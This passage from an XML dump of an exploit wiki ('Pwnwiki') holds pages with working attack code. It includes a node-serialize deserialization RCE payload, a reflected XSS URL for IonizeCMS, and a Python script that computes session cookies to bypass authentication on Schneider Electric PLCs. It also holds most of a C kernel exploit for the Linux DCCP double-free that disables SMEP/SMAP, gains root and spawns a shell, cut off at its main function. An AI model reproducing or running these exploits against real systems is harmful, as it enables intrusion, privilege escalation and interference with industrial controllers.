      <comment>Created page with "==EXP== &lt;pre&gt; var serialize = require('node-serialize'); var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stde..."</comment>
      <origin>1512</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="250" sha1="r7rxw39nmhj7hzb3cjfq8161desug20" xml:space="preserve">==EXP==
&lt;pre&gt;
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
serialize.unserialize(payload);
&lt;/pre&gt;</text>
      <sha1>r7rxw39nmhj7hzb3cjfq8161desug20</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2017-5961 IonizeCMS XSS漏洞</title>
    <ns>0</ns>
    <id>5763</id>
    <revision>
      <id>6628</id>
      <timestamp>2021-07-10T06:16:52Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; &lt;=Ionize 1.0.8  ==POC== &lt;pre&gt; http://&lt;target&gt;/testcmsofgithub/ionize-master/ionize-master/themes/admin/javascript/tinym..."</comment>
      <origin>6628</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="306" sha1="qf9relkmmdde2va5nv3dmnyv7s2mpqn" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
&lt;=Ionize 1.0.8

==POC==
&lt;pre&gt;
http://&lt;target&gt;/testcmsofgithub/ionize-master/ionize-master/themes/admin/javascript/tinymce/jscripts/tiny_mce/plugins/codemirror/dialog.php?path=%22%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E%3Cscript%20%22
&lt;/pre&gt;</text>
      <sha1>qf9relkmmdde2va5nv3dmnyv7s2mpqn</sha1>
    </revision>
    <revision>
      <id>6629</id>
      <parentid>6628</parentid>
      <timestamp>2021-07-10T06:42:34Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>6629</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="317" sha1="tq3ieftvjmyi22iajp18hkjq53iw5vi" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;=Ionize 1.0.8

==POC==
&lt;pre&gt;
http://&lt;target&gt;/testcmsofgithub/ionize-master/ionize-master/themes/admin/javascript/tinymce/jscripts/tiny_mce/plugins/codemirror/dialog.php?path=%22%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E%3Cscript%20%22
&lt;/pre&gt;</text>
      <sha1>tq3ieftvjmyi22iajp18hkjq53iw5vi</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2017-5961 IonizeCMS XSS漏洞/zh-cn</title>
    <ns>0</ns>
    <id>6157</id>
    <revision>
      <id>7041</id>
      <timestamp>2021-07-12T07:08:59Z</timestamp>
      <contributor>
        <username>Xc1ym</username>
        <id>256</id>
      </contributor>
      <comment>Created page with "CVE-2017-5961 IonizeCMS XSS漏洞"</comment>
      <origin>7041</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="342" sha1="bfbp4dpw59uepzg2y3nc70pimxoxks0" xml:space="preserve">&lt;languages /&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==漏洞影響==
&lt;/div&gt;
&lt;=Ionize 1.0.8

==POC==
&lt;pre&gt;
http://&lt;target&gt;/testcmsofgithub/ionize-master/ionize-master/themes/admin/javascript/tinymce/jscripts/tiny_mce/plugins/codemirror/dialog.php?path=%22%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E%3Cscript%20%22
&lt;/pre&gt;</text>
      <sha1>bfbp4dpw59uepzg2y3nc70pimxoxks0</sha1>
    </revision>
    <revision>
      <id>7042</id>
      <parentid>7041</parentid>
      <timestamp>2021-07-12T07:09:08Z</timestamp>
      <contributor>
        <username>Xc1ym</username>
        <id>256</id>
      </contributor>
      <comment>Created page with "==漏洞影响=="</comment>
      <origin>7042</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="281" sha1="kqqma1toqss6q06s3t9k4mi10gc7zph" xml:space="preserve">&lt;languages /&gt;
==漏洞影响==
&lt;=Ionize 1.0.8

==POC==
&lt;pre&gt;
http://&lt;target&gt;/testcmsofgithub/ionize-master/ionize-master/themes/admin/javascript/tinymce/jscripts/tiny_mce/plugins/codemirror/dialog.php?path=%22%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E%3Cscript%20%22
&lt;/pre&gt;</text>
      <sha1>kqqma1toqss6q06s3t9k4mi10gc7zph</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2017-6026 Schneider Electric PLC 會話認證繞過漏洞</title>
    <ns>0</ns>
    <id>470</id>
    <revision>
      <id>671</id>
      <timestamp>2021-03-27T02:30:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; #! /usr/bin/env python '''     Copyright 2018 Photubias(c)     # Exploit Title: Schneider Session Calculation - CVE-2017-6026     # Date: 2018-09-30     # Exploi..."</comment>
      <origin>671</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4910" sha1="merlqqr7aely1nggq3vo8pk5k34of68" xml:space="preserve">==POC==
&lt;pre&gt;
#! /usr/bin/env python
'''
    Copyright 2018 Photubias(c)
    # Exploit Title: Schneider Session Calculation - CVE-2017-6026
    # Date: 2018-09-30
    # Exploit Author: Deneut Tijl
    # Vendor Homepage: www.schneider-electric.com
    # Software Link: https://www.schneider-electric.com/en/download/document/M241-M251+Firmware+v4.0.3.20/
    # Version: Schneider Electric PLC 4.0.2.11 &amp; Boot v0.0.2.11
    # CVE : CVE-2017-6026
 
        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation, either version 3 of the License, or
        (at your option) any later version.
 
        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.
 
        You should have received a copy of the GNU General Public License
        along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.
 
        File name CVE-2017-6026-SchneiderSessionCalculation.py
        written by tijl[dot]deneut[at]howest[dot]be
 
        Tested on the Schneider TM241 PLC with Firmware 4.0.2.11 &amp; Boot 0.0.2.11.
        Firmware: https://www.schneider-electric.com/en/download/document/M241-M251+Firmware+v4.0.3.20/
        Security Note: https://www.schneider-electric.com/en/download/document/SEVD-2017-075-02/
 
        This script will calculate the website session cookie, which is static after every reboot.
        (This cookie is actually the Epoch time at PLC startup)
        The only prerequisite is that, since the reboot, a user must have been logged in.
                E.g. Administrator (with default password 'admin')
                or   USER (with default password 'USER')
 
        After retrieving the cookie, various website actions are possible (including a DoS).
        Sample output:
        C:\Users\admin\Desktop&gt;SchneiderGetSession.py
        Please enter an IP [10.10.36.224]:
        This device has booted 33 times
        Cookie: 1521612584 (22/03/2018 06:09:44.014)
        ----------------
        --- Device:      TM241CE40R
        --- MAC Address: 0080F40B24E0
        --- Firmware:    4.0.2.11
        --- Controller:  Running
        ----------------
        Press Enter to close
'''
import urllib2
 
strIP = raw_input('Please enter an IP [10.10.36.224]: ')
if strIP == '': strIP = '10.10.36.224'
FwLogURL = 'http://' + strIP + '/usr/Syslog/FwLog.txt'
try:
    FwLogResp = urllib2.urlopen(urllib2.Request(FwLogURL)).readlines()
    NumberOfPowerOns = 0
    for line in FwLogResp:
        if 'Firmware core2' in line:
            NumberOfPowerOns += 1
            CookieVal = line.split(' ')[1]
            BootupTime = line.split('(')[1].split(')')[0]
    NumberOfPowerOns /= 2
except:
    print('Error: URL not found.')
    raw_input('Press enter to exit')
    exit()
 
try:
    CookieVal
except:
    print('Error: ' + FwLogURL + ' does not contain the necessary data.')
    raw_input('Press Enter to Exit')
    exit()
 
print('This device has booted ' + str(NumberOfPowerOns) + ' times')
print('Cookie: ' + CookieVal + ' (' + BootupTime + ')')
print('----------------')
raw_input('Press enter to see if the cookie is set on the webserver.'+"\n")
 
CtrlURL = 'http://' + strIP + '/plcExchange/getValues/'
CtrlPost = 'S;100;0;136;s;s;S;2;0;24;w;d;S;1;0;8;B;d;S;1;0;9;B;d;S;1;0;10;B;d;S;1;0;11;B;d;'
 
try:
    CtrlUser = 'Administrator'
    DataReq = urllib2.Request(CtrlURL, CtrlPost, headers={'Cookie':'M258_LOG=' + CtrlUser + ':' + CookieVal})
    DataResp = urllib2.urlopen(DataReq).read()
except:
    print('Failure for user \'Administrator\'')
    try:
        CtrlUser = 'USER'
        DataReq = urllib2.Request(CtrlURL, CtrlPost, headers={'Cookie':'M258_LOG=' + CtrlUser + ':' + CookieVal})
        DataResp = urllib2.urlopen(DataReq).read()
    except:
        print('Failure for user \'USER\'')
        raw_input('Press enter to exit')
print('### SUCCESS (' + CtrlUser + ') ###')
print('--- Device:      ' + DataResp.split(' ')[0])
print('--- MAC Address: ' + DataResp.split(';')[0].split(' ')[1][1:])
print('--- Firmware:    ' + DataResp.split(';')[2] + '.' + DataResp.split(';')[3] + '.' +DataResp.split(';')[4] + '.' +DataResp.split(';')[5])
state = DataResp.split(';')[1]
if state == '2':
    print('--- Controller:  Running')
elif state == '1':
    print('--- Controller:  Stopped')
elif state == '0':
    print('--- Controller:  ERROR mode')
print('')
print('--- To exploit: Create cookie for domain "'+strIP+'"')
print('    with name "M258_LOG" and value "'+CtrlUser+':'+CookieVal+'"')
print('    and open "http://'+strIP+'/index2.htm"')
print('')
print('----------------')
 
raw_input('Press enter to close')
exit() 
&lt;/pre&gt;</text>
      <sha1>merlqqr7aely1nggq3vo8pk5k34of68</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2017-6074 Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free 特權提升漏洞</title>
    <ns>0</ns>
    <id>2791</id>
    <revision>
      <id>3292</id>
      <timestamp>2021-05-26T12:41:16Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; // // EDB Note: More information ~ http://seclists.org/oss-sec/2017/q1/471 // // A proof-of-concept local root exploit for CVE-2017-6074. // Includes a semirelia..."</comment>
      <origin>3292</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="17427" sha1="geuxw32zfgmou0gbxh9doxmzqes1an3" xml:space="preserve">==EXP==
&lt;pre&gt;
//
// EDB Note: More information ~ http://seclists.org/oss-sec/2017/q1/471
//
// A proof-of-concept local root exploit for CVE-2017-6074.
// Includes a semireliable SMAP/SMEP bypass.
// Tested on 4.4.0-62-generic #83-Ubuntu kernel.
// https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-6074
//
// Usage:
// $ gcc poc.c -o pwn
// $ ./pwn
// [.] namespace sandbox setup successfully
// [.] disabling SMEP &amp; SMAP
// [.] scheduling 0xffffffff81064550(0x406e0)
// [.] waiting for the timer to execute
// [.] done
// [.] SMEP &amp; SMAP should be off now
// [.] getting root
// [.] executing 0x402043
// [.] done
// [.] should be root now
// [.] checking if we got root
// [+] got r00t ^_^
// [!] don't kill the exploit binary, the kernel will crash
// # cat /etc/shadow
// ...
// daemon:*:17149:0:99999:7:::
// bin:*:17149:0:99999:7:::
// sys:*:17149:0:99999:7:::
// sync:*:17149:0:99999:7:::
// games:*:17149:0:99999:7:::
// ...
//
// Andrey Konovalov &lt;andreyknvl@gmail.com&gt;
#define _GNU_SOURCE
#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdarg.h&gt;
#include &lt;stdbool.h&gt;
#include &lt;stddef.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sched.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;linux/if_packet.h&gt;
#include &lt;netinet/if_ether.h&gt;
#define SMEP_SMAP_BYPASS    1
// Needed for local root.
#define COMMIT_CREDS        0xffffffff810a2840L
#define PREPARE_KERNEL_CRED    0xffffffff810a2c30L
#define SHINFO_OFFSET        1728
// Needed for SMEP_SMAP_BYPASS.
#define NATIVE_WRITE_CR4    0xffffffff81064550ul
#define CR4_DESIRED_VALUE    0x406e0ul
#define TIMER_OFFSET        (728 + 48 + 104)
#define KMALLOC_PAD 128
#define KMALLOC_WARM 32
#define CATCH_FIRST 6
#define CATCH_AGAIN 16
#define CATCH_AGAIN_SMALL 64
// Port is incremented on each use.
static int port = 11000;
void debug(const char *msg) {
/*
    char buffer[32];
    snprintf(&amp;buffer[0], sizeof(buffer), "echo '%s' &gt; /dev/kmsg\n", msg);
    system(buffer);
*/
}
// * * * * * * * * * * * * * * Kernel structs * * * * * * * * * * * * * * * *
struct ubuf_info {
    uint64_t callback;        // void (*callback)(struct ubuf_info *, bool)
    uint64_t ctx;            // void *
    uint64_t desc;            // unsigned long
};
struct skb_shared_info {
    uint8_t  nr_frags;        // unsigned char
    uint8_t  tx_flags;        // __u8
    uint16_t gso_size;        // unsigned short
    uint16_t gso_segs;        // unsigned short
    uint16_t gso_type;        // unsigned short
    uint64_t frag_list;        // struct sk_buff *
    uint64_t hwtstamps;        // struct skb_shared_hwtstamps
    uint32_t tskey;            // u32
    uint32_t ip6_frag_id;        // __be32
    uint32_t dataref;        // atomic_t
    uint64_t destructor_arg;    // void *
    uint8_t  frags[16][17];        // skb_frag_t frags[MAX_SKB_FRAGS];
};
struct ubuf_info ui;
void init_skb_buffer(char* buffer, void *func) {
    memset(&amp;buffer[0], 0, 2048);
    struct skb_shared_info *ssi = (struct skb_shared_info *)&amp;buffer[SHINFO_OFFSET];
    ssi-&gt;tx_flags = 0xff;
    ssi-&gt;destructor_arg = (uint64_t)&amp;ui;
    ssi-&gt;nr_frags = 0;
    ssi-&gt;frag_list = 0;
    ui.callback = (unsigned long)func;
}
struct timer_list {
    void        *next;
    void        *prev;
    unsigned long    expires;
    void        (*function)(unsigned long);
    unsigned long    data;
    unsigned int    flags;
    int        slack;
};
void init_timer_buffer(char* buffer, void *func, unsigned long arg) {
    memset(&amp;buffer[0], 0, 2048);
    struct timer_list* timer = (struct timer_list *)&amp;buffer[TIMER_OFFSET];
    timer-&gt;next = 0;
    timer-&gt;prev = 0;
    timer-&gt;expires = 4294943360;
    timer-&gt;function = func;
    timer-&gt;data = arg;
    timer-&gt;flags = 1;
    timer-&gt;slack = -1;
}
// * * * * * * * * * * * * * * * Trigger * * * * * * * * * * * * * * * * * *
struct dccp_handle {
    struct sockaddr_in6 sa;
    int s1;
    int s2;
};
void dccp_init(struct dccp_handle *handle, int port) {
    handle-&gt;sa.sin6_family = AF_INET6;
    handle-&gt;sa.sin6_port = htons(port);
    inet_pton(AF_INET6, "::1", &amp;handle-&gt;sa.sin6_addr);
    handle-&gt;sa.sin6_flowinfo = 0;
    handle-&gt;sa.sin6_scope_id = 0;
    handle-&gt;s1 = socket(PF_INET6, SOCK_DCCP, IPPROTO_IP);
    if (handle-&gt;s1 == -1) {
        perror("socket(SOCK_DCCP)");
        exit(EXIT_FAILURE);
    }
    int rv = bind(handle-&gt;s1, &amp;handle-&gt;sa, sizeof(handle-&gt;sa));
    if (rv != 0) {
        perror("bind()");
        exit(EXIT_FAILURE);
    }
    rv = listen(handle-&gt;s1, 0x9);
    if (rv != 0) {
        perror("listen()");
        exit(EXIT_FAILURE);
    }
    int optval = 8;
    rv = setsockopt(handle-&gt;s1, IPPROTO_IPV6, IPV6_RECVPKTINFO,
            &amp;optval, sizeof(optval));
    if (rv != 0) {
        perror("setsockopt(IPV6_RECVPKTINFO)");
        exit(EXIT_FAILURE);
    }
    handle-&gt;s2 = socket(PF_INET6, SOCK_DCCP, IPPROTO_IP);
    if (handle-&gt;s1 == -1) {
        perror("socket(SOCK_DCCP)");
        exit(EXIT_FAILURE);
    }
}
void dccp_kmalloc_kfree(struct dccp_handle *handle) {
    int rv = connect(handle-&gt;s2, &amp;handle-&gt;sa, sizeof(handle-&gt;sa));
    if (rv != 0) {
        perror("connect(SOCK_DCCP)");
        exit(EXIT_FAILURE);
    }
}
void dccp_kfree_again(struct dccp_handle *handle) {
    int rv = shutdown(handle-&gt;s1, SHUT_RDWR);
    if (rv != 0) {
        perror("shutdown(SOCK_DCCP)");
        exit(EXIT_FAILURE);
    }
}
void dccp_destroy(struct dccp_handle *handle) {
    close(handle-&gt;s1);
    close(handle-&gt;s2);
}
// * * * * * * * * * * * * * * Heap spraying * * * * * * * * * * * * * * * * *
struct udp_fifo_handle {
    int fds[2];
};
void udp_fifo_init(struct udp_fifo_handle* handle) {
    int rv = socketpair(AF_LOCAL, SOCK_DGRAM, 0, handle-&gt;fds);
    if (rv != 0) {
        perror("socketpair()");
        exit(EXIT_FAILURE);
    }
}
void udp_fifo_destroy(struct udp_fifo_handle* handle) {
    close(handle-&gt;fds[0]);
    close(handle-&gt;fds[1]);
}
void udp_fifo_kmalloc(struct udp_fifo_handle* handle, char *buffer) {
    int rv = send(handle-&gt;fds[0], buffer, 1536, 0);
    if (rv != 1536) {
        perror("send()");
        exit(EXIT_FAILURE);
    }
}
void udp_fifo_kmalloc_small(struct udp_fifo_handle* handle) {
    char buffer[128];
    int rv = send(handle-&gt;fds[0], &amp;buffer[0], 128, 0);
    if (rv != 128) {
        perror("send()");
        exit(EXIT_FAILURE);
    }
}
void udp_fifo_kfree(struct udp_fifo_handle* handle) {
      char buffer[2048];
    int rv = recv(handle-&gt;fds[1], &amp;buffer[0], 1536, 0);
    if (rv != 1536) {
        perror("recv()");
        exit(EXIT_FAILURE);
    }
}
int timer_kmalloc() {
    int s = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
    if (s == -1) {
        perror("socket(SOCK_DGRAM)");
        exit(EXIT_FAILURE);
    }
    return s;
}
#define CONF_RING_FRAMES 1
void timer_schedule(int handle, int timeout) {
    int optval = TPACKET_V3;
    int rv = setsockopt(handle, SOL_PACKET, PACKET_VERSION,
            &amp;optval, sizeof(optval));
    if (rv != 0) {
        perror("setsockopt(PACKET_VERSION)");
        exit(EXIT_FAILURE);
    }
    struct tpacket_req3 tp;
    memset(&amp;tp, 0, sizeof(tp));
    tp.tp_block_size = CONF_RING_FRAMES * getpagesize();
    tp.tp_block_nr = 1;
    tp.tp_frame_size = getpagesize();
    tp.tp_frame_nr = CONF_RING_FRAMES;
    tp.tp_retire_blk_tov = timeout;
    rv = setsockopt(handle, SOL_PACKET, PACKET_RX_RING,
            (void *)&amp;tp, sizeof(tp));
    if (rv != 0) {
        perror("setsockopt(PACKET_RX_RING)");
        exit(EXIT_FAILURE);
    }
}
void socket_sendmmsg(int sock, char *buffer) {
    struct mmsghdr msg[1];
    msg[0].msg_hdr.msg_iovlen = 0;
    // Buffer to kmalloc.
    msg[0].msg_hdr.msg_control = &amp;buffer[0];
    msg[0].msg_hdr.msg_controllen = 2048;
    // Make sendmmsg exit easy with EINVAL.
    msg[0].msg_hdr.msg_name = "root";
    msg[0].msg_hdr.msg_namelen = 1;
    int rv = syscall(__NR_sendmmsg, sock, msg, 1, 0);
    if (rv == -1 &amp;&amp; errno != EINVAL) {
        perror("[-] sendmmsg()");
        exit(EXIT_FAILURE);
    }
}
void sendmmsg_kmalloc_kfree(int port, char *buffer) {
    int sock[2];
    int rv = socketpair(AF_LOCAL, SOCK_DGRAM, 0, sock);
    if (rv != 0) {
        perror("socketpair()");
        exit(EXIT_FAILURE);
    }
    socket_sendmmsg(sock[0], buffer);
    close(sock[0]);
}
// * * * * * * * * * * * * * * Heap warming * * * * * * * * * * * * * * * * *
void dccp_connect_pad(struct dccp_handle *handle, int port) {
    handle-&gt;sa.sin6_family = AF_INET6;
    handle-&gt;sa.sin6_port = htons(port);
    inet_pton(AF_INET6, "::1", &amp;handle-&gt;sa.sin6_addr);
    handle-&gt;sa.sin6_flowinfo = 0;
    handle-&gt;sa.sin6_scope_id = 0;
    handle-&gt;s1 = socket(PF_INET6, SOCK_DCCP, IPPROTO_IP);
    if (handle-&gt;s1 == -1) {
        perror("socket(SOCK_DCCP)");
        exit(EXIT_FAILURE);
    }
    int rv = bind(handle-&gt;s1, &amp;handle-&gt;sa, sizeof(handle-&gt;sa));
    if (rv != 0) {
        perror("bind()");
        exit(EXIT_FAILURE);
    }
    rv = listen(handle-&gt;s1, 0x9);
    if (rv != 0) {
        perror("listen()");
        exit(EXIT_FAILURE);
    }
    handle-&gt;s2 = socket(PF_INET6, SOCK_DCCP, IPPROTO_IP);
    if (handle-&gt;s1 == -1) {
        perror("socket(SOCK_DCCP)");
        exit(EXIT_FAILURE);
    }
    rv = connect(handle-&gt;s2, &amp;handle-&gt;sa, sizeof(handle-&gt;sa));
    if (rv != 0) {
        perror("connect(SOCK_DCCP)");
        exit(EXIT_FAILURE);
    }
}
void dccp_kmalloc_pad() {
    int i;
    struct dccp_handle handle;
    for (i = 0; i &lt; 4; i++) {
        dccp_connect_pad(&amp;handle, port++);
    }
}
void timer_kmalloc_pad() {
    int i;
    for (i = 0; i &lt; 4; i++) {
        socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
    }
}
void udp_kmalloc_pad() {
    int i, j;
    char dummy[2048];
    struct udp_fifo_handle uh[16];
    for (i = 0; i &lt; KMALLOC_PAD / 16; i++) {
        udp_fifo_init(&amp;uh[i]);
        for (j = 0; j &lt; 16; j++)
            udp_fifo_kmalloc(&amp;uh[i], &amp;dummy[0]);
    }
}
void kmalloc_pad() {
    debug("dccp kmalloc pad");
    dccp_kmalloc_pad();
    debug("timer kmalloc pad");
    timer_kmalloc_pad();
    debug("udp kmalloc pad");
    udp_kmalloc_pad();
}
void udp_kmalloc_warm() {
    int i, j;
    char dummy[2048];
    struct udp_fifo_handle uh[16];
    for (i = 0; i &lt; KMALLOC_WARM / 16; i++) {
        udp_fifo_init(&amp;uh[i]);
        for (j = 0; j &lt; 16; j++)
            udp_fifo_kmalloc(&amp;uh[i], &amp;dummy[0]);
    }
    for (i = 0; i &lt; KMALLOC_WARM / 16; i++) {
        for (j = 0; j &lt; 16; j++)
            udp_fifo_kfree(&amp;uh[i]);
    }
}
void kmalloc_warm() {
    udp_kmalloc_warm();
}
// * * * * * * * * * * * * * Disabling SMEP/SMAP * * * * * * * * * * * * * * *
// Executes func(arg) from interrupt context multiple times.
void kernel_exec_irq(void *func, unsigned long arg) {
    int i;
    struct dccp_handle dh;
    struct udp_fifo_handle uh1, uh2, uh3, uh4;
    char dummy[2048];
    char buffer[2048];
    printf("[.] scheduling %p(%p)\n", func, (void *)arg);
    memset(&amp;dummy[0], 0xc3, 2048);
    init_timer_buffer(&amp;buffer[0], func, arg);
    udp_fifo_init(&amp;uh1);
    udp_fifo_init(&amp;uh2);
    udp_fifo_init(&amp;uh3);
    udp_fifo_init(&amp;uh4);
    debug("kmalloc pad");
    kmalloc_pad();
    debug("kmalloc warm");
    kmalloc_warm();
    debug("dccp init");
    dccp_init(&amp;dh, port++);
    debug("dccp kmalloc kfree");
    dccp_kmalloc_kfree(&amp;dh);
    debug("catch 1");
    for (i = 0; i &lt; CATCH_FIRST; i++)
        udp_fifo_kmalloc(&amp;uh1, &amp;dummy[0]);
    debug("dccp kfree again");
    dccp_kfree_again(&amp;dh);
    debug("catch 2");
    for (i = 0; i &lt; CATCH_FIRST; i++)
        udp_fifo_kmalloc(&amp;uh2, &amp;dummy[0]);
    int timers[CATCH_FIRST];
    debug("catch 1 -&gt; timer");
    for (i = 0; i &lt; CATCH_FIRST; i++) {
        udp_fifo_kfree(&amp;uh1);
        timers[i] = timer_kmalloc();
    }
    debug("catch 1 small");
    for (i = 0; i &lt; CATCH_AGAIN_SMALL; i++)
        udp_fifo_kmalloc_small(&amp;uh4);
    debug("schedule timers");
    for (i = 0; i &lt; CATCH_FIRST; i++)
        timer_schedule(timers[i], 500);
    debug("catch 2 -&gt; overwrite timers");
    for (i = 0; i &lt; CATCH_FIRST; i++) {
        udp_fifo_kfree(&amp;uh2);
        udp_fifo_kmalloc(&amp;uh3, &amp;buffer[0]);
    }
    debug("catch 2 small");
    for (i = 0; i &lt; CATCH_AGAIN_SMALL; i++)
        udp_fifo_kmalloc_small(&amp;uh4);
    printf("[.] waiting for the timer to execute\n");
    debug("wait");
    sleep(1);
    printf("[.] done\n");
}
void disable_smep_smap() {
    printf("[.] disabling SMEP &amp; SMAP\n");
    kernel_exec_irq((void *)NATIVE_WRITE_CR4, CR4_DESIRED_VALUE);
    printf("[.] SMEP &amp; SMAP should be off now\n");
}
// * * * * * * * * * * * * * * * Getting root * * * * * * * * * * * * * * * * *
// Executes func() from process context.
void kernel_exec(void *func) {
    int i;
    struct dccp_handle dh;
    struct udp_fifo_handle uh1, uh2, uh3;
    char dummy[2048];
    char buffer[2048];
    printf("[.] executing %p\n", func);
    memset(&amp;dummy[0], 0, 2048);
    init_skb_buffer(&amp;buffer[0], func);
    udp_fifo_init(&amp;uh1);
    udp_fifo_init(&amp;uh2);
    udp_fifo_init(&amp;uh3);
    debug("kmalloc pad");
    kmalloc_pad();
    debug("kmalloc warm");
    kmalloc_warm();
    debug("dccp init");
    dccp_init(&amp;dh, port++);
    debug("dccp kmalloc kfree");
    dccp_kmalloc_kfree(&amp;dh);
    debug("catch 1");
    for (i = 0; i &lt; CATCH_FIRST; i++)
        udp_fifo_kmalloc(&amp;uh1, &amp;dummy[0]);
    debug("dccp kfree again:");
    dccp_kfree_again(&amp;dh);
    debug("catch 2");
    for (i = 0; i &lt; CATCH_FIRST; i++)
        udp_fifo_kmalloc(&amp;uh2, &amp;dummy[0]);
    debug("catch 1 -&gt; overwrite");
    for (i = 0; i &lt; CATCH_FIRST; i++) {
        udp_fifo_kfree(&amp;uh1);
        sendmmsg_kmalloc_kfree(port++, &amp;buffer[0]);
    }
    debug("catch 2 -&gt; free &amp; trigger");
    for (i = 0; i &lt; CATCH_FIRST; i++)
        udp_fifo_kfree(&amp;uh2);
    debug("catch 1 &amp; 2");
    for (i = 0; i &lt; CATCH_AGAIN; i++)
        udp_fifo_kmalloc(&amp;uh3, &amp;dummy[0]);
    printf("[.] done\n");
}
typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;
void get_root_payload(void) {
    commit_creds(prepare_kernel_cred(0));
}
void get_root() {
    printf("[.] getting root\n");
    kernel_exec(&amp;get_root_payload);
    printf("[.] should be root now\n");
}
// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * * *
void exec_shell() {
    char *shell = "/bin/bash";
    char *args[] = {shell, "-i", NULL};
    execve(shell, args, NULL);
}
void fork_shell() {
    pid_t rv;
    rv = fork();
    if (rv == -1) {
        perror("fork()");
        exit(EXIT_FAILURE);
    }
    if (rv == 0) {
        exec_shell();
    }
}
bool is_root() {
    // We can't simple check uid, since we're running inside a namespace
    // with uid set to 0. Try opening /etc/shadow instead.
    int fd = open("/etc/shadow", O_RDONLY);
    if (fd == -1)
        return false;
    close(fd);
    return true;
}
void check_root() {
    printf("[.] checking if we got root\n");
    if (!is_root()) {
        printf("[-] something went wrong =(\n");
        printf("[!] don't kill the exploit binary, the kernel will crash\n");
        return;
    }
    printf("[+] got r00t ^_^\n");
    printf("[!] don't kill the exploit binary, the kernel will crash\n");
    // Fork and exec instead of just doing the exec to avoid freeing
    // skbuffs and prevent crashes due to a allocator corruption.
    fork_shell();
}
static bool write_file(const char* file, const char* what, ...)
{
    char buf[1024];
    va_list args;
    va_start(args, what);
    vsnprintf(buf, sizeof(buf), what, args);
    va_end(args);
    buf[sizeof(buf) - 1] = 0;
    int len = strlen(buf);
    int fd = open(file, O_WRONLY | O_CLOEXEC);
    if (fd == -1)
        return false;
    if (write(fd, buf, len) != len) {
        close(fd);
        return false;
    }
    close(fd);
    return true;
}
void setup_sandbox() {
    int real_uid = getuid();
    int real_gid = getgid();
        if (unshare(CLONE_NEWUSER) != 0) {
        perror("unshare(CLONE_NEWUSER)");
        exit(EXIT_FAILURE);
    }
        if (unshare(CLONE_NEWNET) != 0) {
        perror("unshare(CLONE_NEWUSER)");
        exit(EXIT_FAILURE);
    }
    if (!write_file("/proc/self/setgroups", "deny")) {
        perror("write_file(/proc/self/set_groups)");
        exit(EXIT_FAILURE);
    }
    if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)){
        perror("write_file(/proc/self/uid_map)");
        exit(EXIT_FAILURE);
    }
    if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
        perror("write_file(/proc/self/gid_map)");
        exit(EXIT_FAILURE);
    }
    cpu_set_t my_set;
    CPU_ZERO(&amp;my_set);
    CPU_SET(0, &amp;my_set);
    if (sched_setaffinity(0, sizeof(my_set), &amp;my_set) != 0) {
        perror("sched_setaffinity()");
        exit(EXIT_FAILURE);
    }
    if (system("/sbin/ifconfig lo up") != 0) {
        perror("system(/sbin/ifconfig lo up)");
        exit(EXIT_FAILURE);
    }
    printf("[.] namespace sandbox setup successfully\n");
}
int main() {
